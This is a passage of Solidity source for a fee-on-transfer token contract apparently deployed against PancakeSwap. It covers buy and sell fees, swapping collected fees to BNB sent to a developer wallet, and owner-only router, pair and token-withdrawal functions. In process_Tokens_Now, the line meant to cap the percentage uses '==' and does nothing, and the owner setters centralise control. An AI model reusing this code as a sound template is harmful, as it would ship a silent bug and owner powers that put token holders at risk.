}\n\n\n        /*\n        */\n\n        \n        bool takeFee = true;\n         \n        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer \u0026\u0026 from != uniswapV2Pair \u0026\u0026 to != uniswapV2Pair)){\n            takeFee = false;\n        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}\n        \n        _tokenTransfer(from,to,amount,takeFee);\n    }\n\n\n\n    /*\n    */\n\n\n    function sendToWallet(address payable wallet, uint256 amount) private {\n            wallet.transfer(amount);\n        }\n\n\n    \n    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n        \n        swapTokensForBNB(contractTokenBalance);\n        uint256 contractBNB = address(this).balance;\n        sendToWallet(Wallet_Dev,contractBNB);\n    }\n\n\n    function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {\n        // Do not trigger if already in swap\n        require(!inSwapAndLiquify, \"Currently processing, try later.\"); \n        if (percent_Of_Tokens_To_Process \u003e 100){percent_Of_Tokens_To_Process == 100;}\n        uint256 tokensOnContract = balanceOf(address(this));\n        uint256 sendTokens = tokensOnContract*percent_Of_Tokens_To_Process/100;\n        swapAndLiquify(sendTokens);\n    }\n\n\n    // Swapping tokens for BNB using PancakeSwap \n    function swapTokensForBNB(uint256 tokenAmount) private {\n\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, \n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    /*\n\n    */\n\n    // Remove random tokens from the contract and send to a wallet\n    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent){\n        require(random_Token_Address != address(this), \"Can not remove native token\");\n        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));\n        if (number_of_tokens \u003e randomBalance){number_of_tokens = randomBalance;}\n        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);\n    }\n\n\n    /*\n    \n\n    */\n\n\n    // Set new router and make the new pair address\n    function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\n        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());\n        uniswapV2Router = _newPCSRouter;\n    }\n   \n    // Set new router\n    function set_New_Router_Address(address newRouter) public onlyOwner() {\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\n        uniswapV2Router = _newPCSRouter;\n    }\n    \n    // Set new address - This will be the \u0027Cake LP\u0027 address for the token pairing\n    function set_New_Pair_Address(address newPair) public onlyOwner() {\n        uniswapV2Pair = newPair;\n    }\n\n    /*\n\n    */\n\n    // Check if token transfer needs to process fees\n    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {\n        \n        \n        if(!takeFee){\n            removeAllFee();\n            } else {\n                txCount++;\n            }\n            _transferTokens(sender, recipient, amount);\n        \n        if(!takeFee)\n            restoreAllFee();\n    }\n\n    // Redistributing tokens and adding the fee to the contract address\n    function _transferTokens(address sender, address recipient, uint256 tAmount) private {\n        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);   \n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n\n    // Calculating the fee in tokens\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {\n        uint256 tDev = tAmount*_TotalFee/100;\n        uint256 tTransferAmount = tAmount.sub(tDev);\n        return (tTransferAmount, tDev);\n    }\n\n\n\n    \n\n\n}"}}